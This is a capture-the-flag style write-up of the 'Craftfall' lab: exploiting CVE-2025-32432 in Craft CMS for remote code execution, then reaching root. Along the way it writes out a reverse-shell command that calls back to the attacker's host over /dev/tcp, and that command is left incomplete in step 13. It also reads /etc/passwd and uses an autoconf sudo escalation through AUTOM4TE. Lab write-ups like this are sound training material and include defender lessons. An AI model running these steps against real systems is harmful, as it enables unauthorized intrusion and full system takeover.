<div align="center">

# 🏢 Craftfall

**Local Lab Writeup — Easy Difficulty**

![Platform](https://img.shields.io/badge/Platform-Local-lightgrey?style=for-the-badge&logo=linux)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Linux-E95420?style=for-the-badge&logo=linux)
![CMS](https://img.shields.io/badge/CMS-Craft%205.6.16-blue?style=for-the-badge)

*A vulnerable Craft CMS installation leading to root through a scheduled-task weakness and a misconfigured `autoconf` sudo rule.*

</div>

---

## 📌 Executive Summary

**Craftfall** is an easy-difficulty local Linux lab running Craft CMS 5.6.16. The attack path combines a pre-authentication remote code execution vulnerability in Craft CMS with local privilege-escalation weaknesses.

The chain requires:

1. Discovering the target's exposed services with Nmap.
2. Identifying the Craft CMS application and its hostname.
3. Exploiting **CVE-2025-32432** to execute commands as `www-data`.
4. Obtaining an interactive reverse shell.
5. Enumerating local users and identifying a world-writable scheduled-task script.
6. Moving from `www-data` to the `zer0arc4` account.
7. Exploiting a passwordless sudo rule for **`autoconf`** using the `AUTOM4TE` environment variable.
8. Obtaining a root shell and accessing the root flag.

---

## 🧾 Target Information

| Property | Value |
|----------|-------|
| **Platform** | Local |
| **Difficulty** | Easy |
| **Category** | Web / Linux |
| **Target Name** | Craftfall |
| **Target IP** | `192.168.10.162` |
| **Target Hostname** | `craft.nyx` |
| **Attacker IP** | `192.168.10.142` |
| **Operating System** | Linux (Debian-based) |
| **Web Application** | Craft CMS `5.6.16` |
| **Web Server** | Apache `2.4.68` |
| **SSH** | OpenSSH `10.0p2` |

---

## 🧭 Enumeration

### 1. 🔎 Initial Port Scan

The first step was to identify the target and discover its exposed TCP services.

```bash
nmap 192.168.10.162
```

**Result:**

```text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```


### 2. 🛰️ Service Version Detection

A more detailed scan was performed to identify the running services and versions.

```bash
nmap -sV -sC 192.168.10.162
```

**Result:**

```text
22/tcp open  ssh   OpenSSH 10.0p2 Debian
80/tcp open  http  Apache httpd 2.4.68 (Debian)
```

The HTTP service redirected to `http://craft.nyx/`, revealing the hostname required to access the application.

 ![Stage 02](images/1.png) 

### 3. 🗂️ Hostname Configuration

The target hostname was added to the Kali machine's `/etc/hosts` file.

```bash
sudo nano /etc/hosts
```

Add the following entry:

```text
192.168.10.162 craft.nyx
```

The application could then be accessed at:

```text
http://craft.nyx/
```

 ![Stage 03](images/2.png) 

### 4. 🌐 Web Application Enumeration

Browsing to `http://craft.nyx/` revealed the default Craft CMS welcome page. The page referenced the `index.twig` template located in the `templates/` directory, identifying Craft CMS as the web application.

 ![Stage 04](images/3.png) 

### 5. 🧪 Vulnerability Research

Research into Craft CMS vulnerabilities identified **CVE-2025-32432**, a remote code execution vulnerability affecting Craft CMS versions before `5.6.17` in the 5.x branch.

The target was identified as running Craft CMS `5.6.16`, making this vulnerability relevant to the lab.

The vendor's fixed release for the 5.x branch is `5.6.17`.


---

## 💥 Initial Access — CVE-2025-32432

### 6. 📥 Obtaining the Proof of Concept

A public proof of concept was obtained from the following GitHub repository:

[ l0lsuit — CVE-2025-32432 Craft CMS RCE ](https://github.com/l0lsuit/CVE-2025-32432-craftcms-rce)

The exploit was downloaded to the Kali machine and prepared for testing against the target.

 ![Stage 06](images/5.png) 

### 7. ⚡ Confirming Remote Code Execution

The exploit was first used to execute the `whoami` command:

```bash
python3 exploit.py -u http://craft.nyx/ -c "whoami"
```

The exploit acquired a Craft CMS session and CSRF token, probed asset IDs through the gadget endpoint, and used PHP session handling to trigger the command payload.

**Result:**

```text
www-data
```

The execution context was then confirmed with:

```bash
python3 exploit.py -u http://craft.nyx/ -c "id"
```

**Result:**

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

RCE was confirmed, and the application was executing commands as the web-server account `www-data`.

 ![Stage 07](images/6.png) 

---

## 🐚 Shell Access

### 8. 🖥️ Identifying the Attacker IP

The Kali machine's network configuration was checked to identify the address for the reverse-shell callback.

```bash
ip a
```

The active interface showed:

```text
192.168.10.142/24
```


### 9. 🔁 Establishing a Reverse Shell

A Netcat listener was started on the attacking machine:

```bash
nc -lnvp 4443
```

The exploit was then used to request a reverse shell. The callback address and port must match the listener:

```bash
python3 exploit.py -u http://craft.nyx/ --shell 192.168.10.142 4443 -a 1
```

A successful connection from `192.168.10.162` was received, providing an interactive shell on the target.

> **Port note:** Use the same port in the exploit payload and listener when reproducing the connection.

 ![Stage 09](images/7.png) 

---

## 🔍 Post-Exploitation Enumeration

### 10. 👤 Local User Enumeration

After obtaining the shell as `www-data`, the local user database and home directories were enumerated.

```bash
cat /etc/passwd
ls /home
```

An account named `zer0arc4` was identified:

```text
zer0arc4:x:1000:1000:zer0arc4,,,:/home/zer0arc4:/bin/bash
```

The user's home directory was not directly accessible from the `www-data` account.

 ![Stage 10](images/8.png) 

### 11. 🕵️ Discovering Scheduled-Task Files

A filesystem search was performed for files associated with `zer0arc4`:

```bash
find . -name 'zer0arc4*'
```

The search identified the following files:

```text
/usr/local/bin/zer0arc4-job.sh
/etc/systemd/system/zer0arc4-job.timer
/etc/systemd/system/zer0arc4-job.service
```

These files indicated that a systemd service and timer were associated with the user's scheduled task.

 ![Stage 11](images/9.png) 

### 12. 📝 Inspecting the Scheduled-Task Script

The permissions of the script were examined:

```bash
ls -l /usr/local/bin/zer0arc4-job.sh
```

**Result:**

```text
-rwxrwxrwx 1 zer0arc4 zer0arc4 348 Sep 20 10:03 /usr/local/bin/zer0arc4-job.sh
```

The `rwxrwxrwx` permission mode means that every local user can read, write, and execute the file. This included the compromised `www-data` account.

 ![Stage 11](images/10.png) 

The script contents were then inspected:

```bash
cat /usr/local/bin/zer0arc4-job.sh
```

```bash
#!/bin/bash

echo "zer0arc4 scheduled task executed: $(date)" >> /tmp/zer0arc4-job.log
```

The writable script and its associated systemd service/timer provided the path used to obtain execution as `zer0arc4`.

 ![Stage 12](images/11.png) 

### 13. 🐚 Obtaining a Shell as zer0arc4

The scheduled-task path was used to obtain a shell in the `zer0arc4` account context.
```bash
echo "bash -c 'bash -i > /dev/tcp/192.168.10.142/4443 0>&1'
```
The new shell was verified with:

 ![Stage 13](images/12.png) 


```bash
whoami
```

**Result:**

```text
zer0arc4
```

 ![Stage 13](images/13.png) 

### 14. 🚩 Retrieving the User Flag

The user's home directory was accessed and the flag file was read:

```bash
cd /home/zer0arc4
ls
cat user.txt
```

**User flag:**

```text
f9020bb8331......
```

 ![Stage 14](images/14.png) 

---

## 👑 Privilege Escalation

### 15. 🔐 Sudo Enumeration

The available sudo permissions were checked:

```bash
sudo -l
```

**Result:**

```text
Matching Defaults entries for zer0arc4 on Craftfall:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin,
    use_pty, env_keep+=AUTOM4TE

User zer0arc4 may run the following commands on Craftfall:
    (root) NOPASSWD: /usr/bin/autoconf
```

Two important details were identified:

- `zer0arc4` can run `/usr/bin/autoconf` as root without a password.
- The `AUTOM4TE` environment variable is preserved by sudo through `env_keep+=AUTOM4TE`.

 ![Stage 15](images/15.png) 

### 16. 🧰 Exploiting autoconf with GTFOBins

The [GTFOBins autoconf entry](https://gtfobins.github.io/gtfobins/autoconf/) documents a technique that can spawn a shell by controlling the `AUTOM4TE` environment variable.

 ![Stage 17](images/16.png) 

First, the working directory was confirmed:

```bash
pwd
```

```text
/home/zer0arc4
```

A helper file containing `/bin/sh` was created and made executable:

```bash
echo '/bin/sh' > /home/zer0arc4/temp.ac
chmod +x /home/zer0arc4/temp.ac
cat /home/zer0arc4/temp.ac
```

**File contents:**

```text
/bin/sh
```

Next, the `configure.ac` file required by `autoconf` was created in the current directory:

```bash
touch configure.ac
```

The sudo-permitted binary was then executed with `AUTOM4TE` pointing to the helper file:

```bash
sudo -u root AUTOM4TE=/home/zer0arc4/temp.ac autoconf
```

 ![Stage 16](images/17.png) 

### 17. 🏆 Root Shell and Root Flag

The resulting shell was checked:

```bash
whoami
```

**Result:**

```text
root
```

The root directory and flag file were then accessed:

```bash
ls /root
cat /root/root.txt
```

**Root flag as provided:**

```text
b0c8813f76687.....
```

 ![Stage 17](images/18.png) 

---

## 🏁 Flags Summary

| Flag | Location | Value |
|------|----------|-------|
| 🚩 User | `/home/zer0arc4/user.txt` | `f9020bb8331......` |
| 🚩 Root | `/root/root.txt` | `b0c8813f76687.....` |

---

## 🧾 Final Kill Chain

```text
Nmap
  → SSH (22) / HTTP (80)
  → craft.nyx — Craft CMS 5.6.16
  → CVE-2025-32432
  → RCE as www-data
  → Reverse shell
  → Local enumeration
  → World-writable zer0arc4-job.sh
  → Shell as zer0arc4
  → user.txt
  → sudo -l
  → NOPASSWD: /usr/bin/autoconf
  → AUTOM4TE environment variable
  → Root shell
  → /root/root.txt
```

---

## 🧠 Lessons Learned

### For Defenders

- ❌ Keep Craft CMS updated and apply security fixes promptly.
- ✅ Never allow untrusted users to modify scripts executed by scheduled services.
- ✅ Restrict systemd service and timer files to trusted administrators.
- ✅ Review sudo permissions and remove unnecessary `NOPASSWD` rules.
- ✅ Avoid preserving environment variables through sudo unless absolutely required.
- ✅ Monitor web-server processes, PHP session files, and scheduled-task modifications.

### For Penetration Testers

- 🔍 Always enumerate all exposed services and identify the actual application version.
- 🔍 Research application-specific CVEs when a CMS is identified.
- 🔍 Verify command execution with simple commands such as `whoami` and `id`.
- 🔍 Check local users, scheduled tasks, writable files, and service configurations after obtaining a shell.
- 🔍 Run `sudo -l` when enumerating privilege-escalation paths.
- 🔍 Check [GTFOBins](https://gtfobins.github.io/) for binaries permitted by sudo.

---

## 📚 References

- [Craft CMS — CVE-2025-32432 Security Advisory](https://craftcms.com/knowledge-base/craft-cms-cve-2025-32432)
- [CVE Record — CVE-2025-32432](https://www.cve.org/CVERecord?id=2025-32432)
- [Craft CMS RCE Proof of Concept](https://github.com/l0lsuit/CVE-2025-32432-craftcms-rce)
- [GTFOBins — autoconf](https://gtfobins.github.io/gtfobins/autoconf/)

---

<div align="center">

**🎯 Challenge:** Craftfall — Local Lab  
**⚙️ Difficulty:** Easy

⭐ *If this write-up helped you, give the repository a star!*

</div>
